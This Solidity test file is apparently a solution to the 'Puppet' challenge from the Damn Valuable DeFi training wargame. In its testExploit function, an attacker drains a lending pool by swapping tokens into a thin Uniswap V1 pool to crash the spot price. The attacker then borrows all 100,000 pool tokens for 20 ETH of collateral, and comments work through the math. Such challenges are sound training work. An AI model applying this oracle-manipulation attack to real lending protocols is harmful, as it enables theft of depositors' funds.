// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;

    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    // (x + Δx) * (y − Δy) = x * y
    // y - Δy = (x * y) / (x + Δx)
    // Δy = y - (x * y) / (x + Δx)
    // Δy = 10 - (10 * 10) / (10 + 1000)
    // Δy = (y * (x + Δx) - x * y) / (x + Δx)
    // Δy = (x * y + y * Δx - x * y) / (x + Δx)
    // Δy = (y * Δx) / (x + Δx)
    // Δy = (10 * 1000) / (10 + 1000)
    // Δy = 9.90099009901 - fee

    // swap -> borrow -> ...
    // swap 1000 TKN for 9.9 ETH
    // borrow 4.95 TKN for 9.9 ETH

    // LP ~= (1010 TKN, 0.1 ETH)
    //
    // 0.1 / 1010 = 0.0000990099
    // 0.0000990099 * 100000 TKN * 2 = 19.80198 ETH

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uint256 result = uniswapExchange.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            9 * 1e18,
            DEADLINE
        );
        assertGt(result, 9 ether);
        puppetPool.borrow{value: 20 ether}(100_000e18);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
